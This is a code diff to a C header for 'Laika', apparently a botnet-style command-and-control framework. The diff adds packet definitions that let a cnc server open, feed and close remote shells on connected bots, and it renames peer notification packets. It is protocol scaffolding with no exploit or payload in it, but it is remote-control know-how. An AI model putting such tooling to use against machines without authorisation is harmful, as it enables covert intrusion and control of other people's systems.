@@ -11,6 +11,10 @@
 #define LAIKA_HOSTNAME_LEN 64
 #define LAIKA_IPV4_LEN 16
 
+/* max number of concurrent shells per peer */
+#define LAIKA_MAX_SHELLS 16
+#define LAIKA_SHELL_DATA_MAX_LENGTH 256
+
 /* first handshake between peer & cnc works as so:
     - peer connects to cnc and sends a LAIKAPKT_HANDSHAKE_REQ with the peer's pubkey, hostname & inet ip
     - after cnc receives LAIKAPKT_HANDSHAKE_REQ, all packets are encrypted
@@ -24,7 +28,18 @@
     uint8_t body[pktSize + crypto_secretbox_MACBYTES]; -- encrypted with shared key & nonce
 */
 
+/*
+    any packet ending with *_RES is cnc 2 peer
+    any packet ending with *_REQ is peer 2 cnc
+    if packet doesn't have either, it can be sent & received by both peer & cnc
+*/
 enum {
+/* ==================================================[[ Peer ]]================================================== */
+    LAIKAPKT_VARPKT,
+    /* layout of LAIKAPKT_VARPKT:
+    *   LAIKAPKT_SIZE pktSize;
+    *   LAIKAPKT_ID pktID;
+    */
     LAIKAPKT_HANDSHAKE_REQ, /* first packet sent by peer & received by cnc */
     /* layout of LAIKAPKT_HANDSHAKE_REQ:
     *   uint8_t laikaMagic[LAIKA_MAGICLEN]; -- LAIKA_MAGIC
@@ -38,26 +53,35 @@ enum {
     /* layout of LAIKAPKT_HANDSHAKE_RES:
     *   uint8_t cncEndian;
     */
+    LAIKAPKT_SHELL_OPEN, /* if sent to bot, opens a shell. if sent to cnc, signifies you opened a shell */
+    /* layout of LAIKAPKT_SHELL_OPEN:
+    *   uint8_t id;
+    */
+    LAIKAPKT_SHELL_CLOSE, /* if sent to bot, closes a shell. if sent to cnc, signifies a shell was closed */
+    /* layout of LAIKAPKT_SHELL_CLOSE:
+    *   uint8_t id;
+    */
+    LAIKAPKT_SHELL_DATA, /* if sent to bot, writes data to stdin of shell. if sent to cnc, writes to 'stdout' of shell */
+    /* layout of LAIKAPKT_SHELL_DATA
+    *   uint8_t id;
+    *   char buf[VAR_PACKET_LENGTH]
+    */
+/* ==================================================[[ Auth ]]================================================== */
     LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ, /* second packet sent by authenticated peers (panel). there is no response packet */
     /* layout of LAIKAPKT_STAGE2_HANDSHAKE_REQ
     *   uint8_t peerType;
     */
-    LAIKAPKT_AUTHENTICATED_ADD_PEER, /* notification that a peer has connected to the cnc */
-    /* layout of LAIKAPKT_AUTHENTICATED_ADD_PEER
+    LAIKAPKT_AUTHENTICATED_ADD_PEER_RES, /* notification that a peer has connected to the cnc */
+    /* layout of LAIKAPKT_AUTHENTICATED_ADD_PEER_RES
     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
     *   char hostname[LAIKA_HOSTNAME_LEN];
     *   char ipv4[LAIKA_IPV4_LEN];
     *   uint8_t peerType;
     */
-    LAIKAPKT_AUTHENTICATED_RMV_PEER, /* notification that a peer has disconnected from the cnc */
-    /* layout of LAIKAPKT_AUTHENTICATED_RMV_PEER
+    LAIKAPKT_AUTHENTICATED_RMV_PEER_RES, /* notification that a peer has disconnected from the cnc */
+    /* layout of LAIKAPKT_AUTHENTICATED_RMV_PEER_RES
     *   uint8_t pubKey[crypto_kx_PUBLICKEYBYTES]; -- pubkey of said bot
     *   uint8_t peerType;
-    */
-    LAIKAPKT_VARPKT_REQ,
-    /* layout of LAIKAPKT_VARPKT_REQ:
-    *   LAIKAPKT_SIZE pktSize;
-    *   LAIKAPKT_ID pktID;
     */
     LAIKAPKT_MAXNONE
 };
